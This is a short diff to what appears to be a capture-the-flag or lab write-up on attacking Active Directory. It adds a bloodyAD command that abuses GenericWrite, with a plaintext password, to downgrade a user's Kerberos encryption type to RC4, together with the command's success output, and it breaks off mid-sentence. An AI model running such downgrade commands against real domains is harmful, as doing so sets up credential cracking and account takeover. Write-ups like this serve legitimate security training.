@@ -670,6 +670,11 @@ Out of the three users `ryan.cole` looks the most interesting since he is part o
 # Compromising `ryan.cole`
 
 ```python
-
+bloodyAD --host dc.hsm-defense.local -d hsm-defense.local -u oscar.mazerath -p 'Password123!' -k set object 'ryan.cole' 'msDS-SupportedEncryptionTypes' -v '4'
+[+] ryan.cole's msDS-SupportedEncryptionTypes has been updated
 ```
+
+Ill first perform an encryption downgrade, using my genericwrite on the user
+
+It could have a
 
